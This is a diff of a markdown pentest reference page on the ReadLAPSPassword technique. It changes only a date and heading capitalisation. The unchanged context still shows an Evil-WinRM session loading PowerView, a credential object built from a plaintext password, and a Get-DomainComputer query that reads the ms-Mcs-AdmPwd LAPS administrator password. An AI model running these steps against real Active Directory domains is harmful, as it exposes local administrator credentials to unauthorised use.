@@ -1,6 +1,6 @@
 ---
 title: "ReadLAPSPassword"
-date: 2024-7-30
+date: 2025-7-25
 tags: ["Credential Dumping", "Powerview", "ReadLAPSpassword", "Active Directory", "Windows", "LAPS"]
 ---
 
@@ -61,7 +61,7 @@ result: 0 Success
 *Evil-WinRM* PS C:\Users\bob\Documents> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (Runas) \[Optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -75,7 +75,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-#### 3. Read LAPS password
+#### 3. Read LAPS Password
 
 ```console
 Get-DomainComputer <TARGET_COMPUTER> -Properties ms-Mcs-AdmPwd
